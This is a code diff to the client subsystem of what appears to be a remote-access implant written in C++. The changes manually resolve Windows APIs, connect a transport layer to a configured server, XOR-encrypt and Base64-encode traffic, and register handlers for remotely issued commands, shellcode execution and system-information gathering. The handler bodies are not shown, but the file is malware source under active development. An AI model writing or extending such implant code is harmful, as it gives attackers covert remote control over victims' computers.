@@ -64,36 +64,47 @@ ClientSubsystem::~ClientSubsystem()
 
 void ClientSubsystem::setupMessaging()
 {
+	std::cout << "ClientSubsystem::setupMessaging()" << std::endl;
 
-	transportLayer_ = TransportLayerFactory::create(config_.transportLayerType_, config_.server_, config_.port_);
+	apiManager_ = new ApiManager();
+	// TODO: loadAPIs must be called here because initializeWinsock() is 
+	// called in the constructor of transportLayer
+	apiManager_->loadAPIs();
+
+	transportLayer_ = TransportLayerFactory::create(
+		apiManager_,
+		config_.transportLayerType_, 
+		config_.server_, 
+		config_.port_);
 	// TODO: check that serializer and encoder are not null first?
 	messageTransformer_ = new MessageTransformer(serializer_, encoder_, encryptor_);
-	messageHandler_ = new MessageHandler(transportLayer_, messageTransformer_);
 
-	dispatcher_ = new Dispatcher();
-	controller_ = new Controller(messageHandler_);
+
 
 	packer_ = new Packer();
+
+	messageHandler_ = new MessageHandler(transportLayer_, messageTransformer_, packer_);
+
+	controller_ = new Controller(messageHandler_, apiManager_);
+
+	dispatcher_ = new Dispatcher();
 }
 
 
 void ClientSubsystem::setupSubcomponents()
 {
+	std::cout << "ClientSubsystem::setupSubcomponents()" << std::endl;
 	
 	serializer_ = ComponentFactory::create(config_.serializerType_);
 	encoder_ = ComponentFactory::create(config_.encoderType_);
 	encryptor_ = ComponentFactory::create(config_.encryptorType_);
-
-	/*
-	serializer_ = new BinarySerializer();
-	encoder_ = new Base64Encoder();
-	encryptor_ = new XorEncryptor();
-	*/
 }
 
-// rename to setupCallbacks ? 
+// TODO: separate into 2 functions... setupCallbacks() and registerEvents()
 void ClientSubsystem::setupEvents()
 {
+	std::cout << "ClientSubsystem::setupEvents()" << std::endl;
+
 	// transportLayer_ calls back to MessageParser
 	transportLayer_->setOnMessage([&](const RawByteBuffer& msg)
 	{
@@ -117,21 +128,33 @@ void ClientSubsystem::setupEvents()
 
 	dispatcher_->registerHandler(MessageType::DEFAULT, [&](const InternalMessage& msg)
 	{
-		std::cout << "dispatch_->registerHandler" << std::endl;
+		std::cout << "dispatch_->registerHandler(MessageType::DEFAULT)" << std::endl;
 		controller_->handleDefault(msg);
 	});
 
 	dispatcher_->registerHandler(MessageType::NONE, [&](const InternalMessage& msg)
 	{
-		std::cout << "dispatch_->registerHandler" << std::endl;
+		std::cout << "dispatch_->registerHandler(MessageType::NONE)" << std::endl;
 		controller_->handleNone(msg);
 	});
 
 	// dispatcher_ executes function associated with MessageType::EXECUTE_COMMAND
 	dispatcher_->registerHandler(MessageType::EXECUTE_COMMAND, [&](const InternalMessage& msg)
 	{
-		std::cout << "dispatch_->registerHandler" << std::endl;
+		std::cout << "dispatch_->registerHandler(MessageType::EXECUTE_COMMAND)" << std::endl;
 		controller_->handleExecuteCommand(msg);
+	});
+
+	dispatcher_->registerHandler(MessageType::EXECUTE_SHELL_CODE, [&](const InternalMessage& msg)
+	{
+		std::cout << "dispatch_->registerHandler(MessageType::EXECUTE_SHELL_CODE)" << std::endl;
+		controller_->handleExecuteShellcode(msg);
+	});
+
+	dispatcher_->registerHandler(MessageType::SYS_INFO, [&](const InternalMessage& msg)
+	{
+		std::cout << "dispatch_->registerHandler(MessageType::SYS_INFO)" << std::endl;
+		controller_->handleSystemInfo(msg);
 	});
 }
 
@@ -145,6 +168,7 @@ void ClientSubsystem::run() // TODO: rename to start??
 {	
 
 	// 1. manually resolve apis
+	//apiManager_->loadAPIs();
 	/*
 	TODO:
 	would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have
